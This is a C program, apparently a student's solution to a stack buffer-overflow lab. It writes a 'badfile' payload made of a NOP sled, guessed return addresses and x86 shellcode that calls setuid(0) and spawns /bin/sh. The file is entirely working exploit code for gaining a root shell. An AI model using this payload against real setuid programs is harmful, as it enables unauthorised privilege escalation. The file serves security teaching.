/* exploit.c */
/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
"\x31\xc0" /* Line 1: xorl %eax,%eax */
"\x31\xdb" /* Line 2: xorl %ebx,%ebx */
"\xb0\xd5" /* Line 3: movb $0xd5,%al */
"\xcd\x80" /* Line 4: int $0x80 */
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;


unsigned long get_sp(void)
{
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
	char buffer[517];
	FILE *badfile;
	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 517);

	/* You need to fill the buffer with appropriate contents here */
	/* ... Put your code here ... */
	char *ptr;
	long *addr_ptr, addr;
	int offset = 200, bsize = 517;
	int i;
	addr = get_sp() + offset;

	ptr = buffer;
	addr_ptr = (long*)(ptr);

	for(i = 0; i < 10; i++)
	      *(addr_ptr++) = addr;

	for (i = 0; i < strlen(shellcode); i++) 
	      buffer[bsize - (sizeof(shellcode) + 1) + i] = shellcode[i];

	buffer[bsize - 1] = '\0';

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}
